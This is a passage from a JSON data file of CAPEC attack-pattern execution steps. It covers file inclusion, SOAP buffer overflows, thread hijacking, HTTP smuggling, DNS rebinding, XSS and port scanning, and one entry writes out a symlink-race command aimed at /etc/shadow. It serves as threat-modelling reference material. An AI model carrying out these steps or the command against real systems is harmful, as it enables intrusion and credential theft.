        "step2": " The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish. ",
        "step3": " If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.\n"
    },
    {
        "id": 160,
        "capec_id": "250",
        "step1": " [Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queries. - Use an automated tool to record all instances of user-controllable input used to contruct XML queries.. - Use a browser to manually explore the website and analyze how the application processes inputs. ",
        "step2": " [Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.. - Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation. ",
        "step3": " [Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.. - Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.\n"
    },
    {
        "id": 161,
        "capec_id": "251"
    },
    {
        "id": 162,
        "capec_id": "252",
        "step1": " [Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like http://vulnerable-website/file.php?file=index.php.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery. ",
        "step2": " [Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.. - Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.. - Use a proxy tool to record results of manual input of local file inclusion probes in known URLs. ",
        "step3": " [Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as /etc/passwd, /etc/shadow, or configuration files for the application that might expose sensitive information.\n"
    },
    {
        "id": 163,
        "capec_id": "253"
    },
    {
        "id": 164,
        "capec_id": "254"
    },
    {
        "id": 165,
        "capec_id": "256",
        "step1": " [Identify target application] The adversary identifies a target application to perform the buffer overflow on. In this attack, adversaries look for applications that utilize SOAP as a communication mechanism. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - The adversary creates a SOAP message that incorrectly specifies the size of its array to be smaller than the size of the actual content by a large margin and sends it to the application. If this causes a crash or some unintended behavior, it is likely that this is a valid injection vector. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs. - The adversary will choose a SOAP type that allows them to put shellcode into the buffer when the array is read into the application. ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary sends the crafted SOAP message to the program, overflowing the buffer.\n"
    },
    {
        "id": 166,
        "capec_id": "257"
    },
    {
        "id": 167,
        "capec_id": "258"
    },
    {
        "id": 168,
        "capec_id": "259"
    },
    {
        "id": 169,
        "capec_id": "26",
        "step1": " The adversary explores to gauge what level of access they have. ",
        "step2": " The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action. ",
        "step3": " The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.\n"
    },
    {
        "id": 170,
        "capec_id": "260"
    },
    {
        "id": 171,
        "capec_id": "261",
        "step1": " [Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.. - Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.. - Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.. - Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.) ",
        "step2": " [Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.. - Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).. - Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system. ",
        "step3": " [Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data. ",
        "step4": " [Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template. - Create variants of expected templates that request additional information. - Create variants that exclude limiting clauses. - Create variants that alter fields taht identify the requester in order to subvert access controls. - Repeat different fuzzing variants until sensitive information is divulged.\n"
    },
    {
        "id": 172,
        "capec_id": "263"
    },
    {
        "id": 173,
        "capec_id": "264"
    },
    {
        "id": 174,
        "capec_id": "265"
    },
    {
        "id": 175,
        "capec_id": "266"
    },
    {
        "id": 176,
        "capec_id": "267",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.. - Try to use different encodings of content in order to bypass validation routines.\n"
    },
    {
        "id": 177,
        "capec_id": "268"
    },
    {
        "id": 178,
        "capec_id": "269"
    },
    {
        "id": 179,
        "capec_id": "27",
        "step1": " [Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.. - Research target platform to determine whether it supports symbolic links.. - Create a symbolic link and ensure that it works as expected on the given platform. ",
        "step2": " [Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.. - Use kernel tracing utility such as ktrace to monitor application behavior.. - Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls. - Watch temporary directories to see when temporary files are created, modified and deleted.. - Analyze source code for open-source systems like Linux, Apache, etc. ",
        "step3": " [Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.. - Create a file that does not exist in the target directory (e.g. touch temp.txt in UNIX-like systems). - On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.. - Verify permissions on target directory ",
        "step4": " [Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.. - Create an infinite loop containing commands such as rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat. Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat, and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.. - Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.\n"
    },
    {
        "id": 180,
        "capec_id": "270",
        "step1": " [Determine target system] The adversary must first determine the system they wish to target. This attack only works on Windows. ",
        "step2": " [Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the Windows registry.. - Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.. - Gain remote access to a system through a variety of means. ",
        "step3": " [Modify Windows registry] The adversary will modify the Windows registry by adding a new entry to the run keys referencing a desired program. This program will be run whenever the user logs in.\n"
    },
    {
        "id": 181,
        "capec_id": "271",
        "step1": " [Find target application and schema] The adversary first finds the application that they want to target. This application must use schemas in some way, so the adversary also needs to confirm that schemas are being used.. - Gain access to the system that the application is on and look for a schema.. - Observe HTTP traffic to the application and look for a schema being transmitted. ",
        "step2": " [Gain access to schema] The adversary gains access to the schema so that they can modify the contents.. - For a local scenario, the adversary needs access to the machine that the schema is located on and gain permissions to alter the contents of the schema file.. - For a remote scenario, the adversary needs to be able to perform an adversary in the middle attack on the HTTP traffic that contains a schema. ",
        "step3": " [Poison schema] Once the adversary gains access to the schema, they will alter it to achieve a desired effect. Locally, they can just modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.. - Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing.. - Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.. - Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).\n"
    },
    {
        "id": 182,
        "capec_id": "272"
    },
    {
        "id": 183,
        "capec_id": "273",
        "step1": " [Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.. - Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.",
        "step2": " [Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure to intended targets in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers. ",
        "step3": " [Cause differential HTTP responses by experimenting with identified HTTP Response vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP response. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.. - Continue the monitoring of HTTP traffic.. - Inject additional HTTP headers to utilize various combinations of HTTP Headers within a single HTTP message such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded message or data in the body of the original message are unprocessed and treated as part of subsequent messages by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP headers combination, the first HTTP agent, in the HTTP message path that receives the HTTP message, takes precedence or only processes the one header but not the other, while the second/final HTTP agent processes the opposite header allowing for embedded HTTP message to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP messages to be smuggled. See Mitigations for details.. - Construct a very large HTTP message via multiple Content-Length headers of various data lengths that can potentially cause subsequent messages to be ignored by an intermediary HTTP agent (e.g., firewall) and/or eventually parsed separately by the target HTTP agent. Note that most modern HTTP infrastructure reject HTTP messages with multiple Content-Length headers.. - Monitor HTTP traffic using a tool such as a Network Protocol Analyzer. ",
        "step4": " :[Perform HTTP Response Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.. - Leverage techniques identified in the Experiment Phase.\n"
    },
    {
        "id": 184,
        "capec_id": "274"
    },
    {
        "id": 185,
        "capec_id": "275",
        "step1": " [Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.. - Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request. ",
        "step2": " [Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value. ",
        "step3": " [Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source. ",
        "step4": " [Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses. ",
        "step5": " [Access & exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.. - Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.. - Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses.\n"
    },
    {
        "id": 186,
        "capec_id": "276"
    },
    {
        "id": 187,
        "capec_id": "277"
    },
    {
        "id": 188,
        "capec_id": "278"
    },
    {
        "id": 189,
        "capec_id": "279",
        "step1": " :[Find target application] The adversary needs to identify an application that uses SOAP as a communication protocol.. - Observe HTTP traffic to an application and look for SOAP headers. ",
        "step2": " [Detect Incorrect SOAP Parameter Handling] The adversary tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.. - Send more data than would seem reasonable for a field and see if the server complains.. - Send nonsense data in a field that expects a certain subset, such as product names or sequence numbers, and see if the server complains.. - Send XML metacharacters as data and see how the server responds. ",
        "step3": " [Manipulate SOAP parameters] The adversary manipulates SOAP parameters in a way that causes undesirable behavior for the server. This can result in denial of service, information disclosure, arbitrary code exection, and more.. - Create a recursive XML payload that will take up all of the memory on the server when parsed, resulting in a denial of service. This is known as the billion laughs attack.. - Insert XML metacharacters into data fields that could cause the server to go into an error state when parsing. This could lead to a denial of service.. - Insert a large amount of data into a field that should have a character limit, causing a buffer overflow.\n"
    },
    {
        "id": 190,
        "capec_id": "28",
        "step1": " [Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.. - Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.. - Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.. - Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.) ",
        "step2": " [Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.. - Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).. - Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system. ",
        "step3": " [Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input. ",
        "step4": " [Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.. - Identify and embed shell code for the target system.. - Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.). - Induce denial of service by exploiting resource leaks or bad error handling.\n"
    },
    {
        "id": 191,
        "capec_id": "280"
    },
    {
        "id": 192,
        "capec_id": "285"
    },
    {
        "id": 193,
        "capec_id": "287",
        "step1": " An adversary sends SYN packets to ports they want to scan and checks the response without completing the TCP handshake. ",
        "step2": " An adversary uses the response from the target to determine the port's state. The adversary can determine the state of a port based on the following responses. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered.\n"
    },
    {
        "id": 194,
        "capec_id": "288"
    },
    {
        "id": 195,
        "capec_id": "289"
    },
    {
        "id": 196,
        "capec_id": "29",
        "step1": " The adversary explores to gauge what level of access they have. ",
        "step2": " The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource. ",
        "step3": " The adversary decides to leverage the race condition by running the race, meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.\n"
    },
    {
        "id": 197,
        "capec_id": "290"
    },
    {
        "id": 198,
        "capec_id": "291"
    },
    {
        "id": 199,
        "capec_id": "292"
    },
    {
        "id": 200,
        "capec_id": "293"
    },
    {
        "id": 201,
        "capec_id": "294"
    },
    {
        "id": 202,
        "capec_id": "295"
    },
    {
        "id": 203,
        "capec_id": "296"
    },
    {
        "id": 204,
        "capec_id": "297"
    },
    {
        "id": 205,
        "capec_id": "298"
    },
    {
        "id": 206,
        "capec_id": "299"
    },
    {
        "id": 207,
        "capec_id": "3",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various leading 'Ghost' character sequences to determine how to application filters them.. - Add additional characters to common sequences such as ../ to see how the application will filter them.. - Try repeating special characters (?, @, #, *, etc.) at the beginning of user input to see how the application filters these out. ",
        "step3": " [Bypass input filtering] Using what the adversary learned about how the application filters input data, they craft specific input data that bypasses the filter. This can lead to directory traversal attacks, arbitrary shell command execution, corruption of files, etc.\n"
    },
    {
        "id": 208,
        "capec_id": "30",
        "step1": " [Determine target thread] The adversary determines the underlying system thread that is subject to user-control ",
        "step2": " [Gain handle to thread] The adversary then gains a handle to a process thread.. - Use the OpenThread API call in Windows on a known thread.. - Cause an exception in a java privileged block public function and catch it, or catch a normal signal. The thread is then hanging and the adversary can attempt to gain a handle to it. ",
        "step3": " [Alter process memory] Once the adversary has a handle to the target thread, they will suspend the thread and alter the memory using native OS calls.. - On Windows, use SuspendThread followed by VirtualAllocEx, WriteProcessMemory, and SetThreadContext. ",
        "step4": " [Resume thread execution] Once the process memory has been altered to execute malicious code, the thread is then resumed.. - On Windows, use ResumeThread.\n"
    },
    {
        "id": 209,
        "capec_id": "300"
    },
    {
        "id": 210,
        "capec_id": "301",
        "step1": " An adversary attempts to initialize a TCP connection with with the target port. ",
        "step2": " An adversary uses the result of their TCP connection to determine the state of the target port. A successful connection indicates a port is open with a service listening on it while a failed connection indicates the port is not open.\n"
    },
    {
        "id": 211,
        "capec_id": "302",
        "step1": " An adversary sends TCP packets with the FIN flag but not associated with an existing connection to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.\n"
    },
    {
        "id": 212,
        "capec_id": "303",
        "step1": " An adversary sends TCP packets with all flags set but not associated with an existing connection to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.\n"
    },
    {
        "id": 213,
        "capec_id": "304",
        "step1": " An adversary sends TCP packets with no flags set and that are not associated with an existing connection to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.\n"
    },
    {
        "id": 214,
        "capec_id": "305",
        "step1": " An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. If a RST packet is received the target port is either closed or the ACK was sent out-of-sync. If no response is received, the target is likely using a stateful firewall.\n"
    },
    {
        "id": 215,
        "capec_id": "306",
        "step1": " An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. Specifically, the adversary views the TCP window size from the returned RST packet if one was received. Depending on the target operating system, a positive window size may indicate an open port while a negative window size may indicate a closed port.\n"
    },
    {
        "id": 216,
        "capec_id": "307",
        "step1": " An adversary sends RCP packets to target ports. ",
        "step2": " An adversary uses the response from the target to determine which, if any, RPC service is running on that port. Responses will vary based on which RPC service is running.\n"
    },
    {
        "id": 217,
        "capec_id": "308",
        "step1": " An adversary sends UDP packets to target ports. ",
        "step2": " An adversary uses the response from the target to determine the port's state. Whether a port responds to a UDP packet is dependant on what application is listening on that port. No response does not indicate the port is not open.\n"
    },
    {
        "id": 218,
        "capec_id": "309"
    },
    {
        "id": 219,
        "capec_id": "31",
        "step1": " [Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.. - Sniff cookie using a network sniffer such as Wireshark. - Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.. - Steal cookie via a cross-site scripting attack.. - Guess cookie contents if it contains predictable information. ",
        "step2": " [Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.. - If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.. - Analyze the cookie's contents to determine whether it contains any sensitive information. ",
        "step3": " [Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.. - Modify logical parts of cookie and send it back to server to observe the effects.. - Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.. - Modify cookie bitwise and send it back to server to observe the effects.. - Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a points balance for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance.\n"
    },
    {
        "id": 220,
        "capec_id": "310"
    },
    {
        "id": 221,
        "capec_id": "311"
    },
    {
        "id": 222,
        "capec_id": "312"
    },
    {
        "id": 223,
        "capec_id": "313"
    },
    {
        "id": 224,
        "capec_id": "314"
    },
    {
        "id": 225,
        "capec_id": "315"
    },
    {
        "id": 226,
        "capec_id": "316"
    },
    {
        "id": 227,
        "capec_id": "317"
    },
    {
        "id": 228,
        "capec_id": "318"
    },
    {
        "id": 229,
        "capec_id": "319"
    },
    {
        "id": 230,
        "capec_id": "32",
        "step1": " [Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery. ",
        "step2": " [Probe public links for XSS vulnerability] The adversary uses the public links gathered in the Explore phase as a target list and requests variations on the URLs they spidered before. They send parameters that include variations of payloads. They record all the responses from the server that include unmodified versions of their script.. - Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious script tag.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 231,
        "capec_id": "320",
        "step1": " [Determine if timestamps are present.] The adversary sends a probe packet to the remote host to identify if timestamps are present. ",
        "step2": " [Record and analyze timestamp values.] If the remote host is using timestamp, obtain several timestamps, analyze them and compare them to known values.. - The adversary sends several requests and records the timestamp values.. - The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.. - The adversary compares this result to a database of known TCP timestamp increments for a possible match.\n"
    },
    {
        "id": 232,
        "capec_id": "321"
    },
    {
        "id": 233,
        "capec_id": "322"
    },
    {
        "id": 234,
        "capec_id": "323"
    },
    {
        "id": 235,
        "capec_id": "324"
    },
    {
        "id": 236,
        "capec_id": "325"
    },
    {
        "id": 237,
        "capec_id": "326"
    },
    {
        "id": 238,
        "capec_id": "327"
    },
    {
        "id": 239,
        "capec_id": "328"
    },
    {
        "id": 240,
        "capec_id": "329"
    },
    {
        "id": 241,
        "capec_id": "33",
        "step1": " [Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.. - Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.",
        "step2": " [Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers. ",
        "step3": " [Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.. - Continue the monitoring of HTTP traffic.. - Utilize various combinations of HTTP Headers within a single HTTP Request such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded requests or data in the body of the original request are unprocessed and treated as part of subsequent requests by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP header combinations, the first HTTP agent, in the HTTP message path that receives the HTTP request, takes precedence or only processes one header but not the other, while the second/final HTTP agent processes the opposite header, allowing for embedded HTTP requests to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation (see Mitigations for details) of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP requests to be smuggled. .. - Construct a very large HTTP request using multiple Content-Length headers of various data lengths that can potentially cause subsequent requests to be ignored by an intermediary HTTP agent (firewall) and/or eventually parsed separately by the target HTTP agent (web server). Note that most modern HTTP infrastructure reject HTTP requests with multiple Content-Length headers.. - Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request. ",
        "step4": " :[Perform HTTP Request Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.. - Leverage techniques identified in the Experiment Phase.\n"
    },
    {
        "id": 242,
        "capec_id": "330"
    },
    {
        "id": 243,
        "capec_id": "331"
    },
    {
        "id": 244,
        "capec_id": "332"
    },
    {
        "id": 245,
        "capec_id": "34",
        "step1": " [Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets. - Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.",
        "step2": " [Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering. ",
        "step3": " [Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data (in the form of HTTP headers with custom strings and embedded web scripts and objects) into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP responses by intermediary and front-end client/victim HTTP agents. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses to intermediary and front-end client/victim HTTP agents, will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.. - Continue the monitoring of HTTP traffic.. - Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.. - Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request. ",
        "step4": " :[Perform HTTP Response Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.. - Leverage techniques identified in the Experiment Phase.\n"
    },
    {
        "id": 246,
        "capec_id": "35"
    },
    {
        "id": 247,
        "capec_id": "36",
        "step1": " [Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.. - Search via internet for known, published services.. - Use automated tools to scan known ports to identify internet-enabled services.. - Dump the code from the chip and then perform reverse engineering to analyze the code. ",
